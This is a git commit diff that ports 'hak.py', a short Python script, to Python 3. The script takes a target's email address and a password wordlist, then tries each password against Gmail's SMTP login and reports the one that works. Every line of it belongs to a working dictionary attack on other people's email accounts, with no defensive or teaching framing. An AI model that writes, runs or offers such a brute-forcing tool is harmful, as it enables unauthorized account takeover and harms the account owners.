407e6dcefc1eafe01ab2aa60cb44d987bbc52293
Mohammed Seffar <89942067+moseffar@users.noreply.github.com>
2024-01-05 16:20:35 +0100

    Update hak.py

--- hak.py
+++ hak.py
@@ -1,20 +1,20 @@
-
 import smtplib
 
-
-smtpserver=smtplib.SMTP("smtp.gmail.com", 587)
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
 
+user = input("Enter the target's email: ")
+passwfile = input("Enter the password File: ")
+passwfile = open(passwfile, "r")
 
-user=raw_input("Enter the target's email : ")
-passwfile=raw_input ("Enter the password File : ")
-passwfile=open(passwfile, "r")
-for password in passwfile :
-       try :
-             smtpserver.login(user, password)
-             print ("[+] Password Found ==>  %s") % password
-             break;
+for password in passwfile:
+    try:
+        smtpserver.login(user, password)
+        print("[+] Password Found ==>  {}".format(password))
+        break
+    except smtplib.SMTPAuthenticationError:
+        print("[!] Password is incorrect a hbibi ===> {}".format(password))
 
-       except smtplib.SMTPAuthenticationError:
-               print ("[!] Password is incorrect a hbibi ===> %s ") %password
+passwfile.close()
+smtpserver.quit()
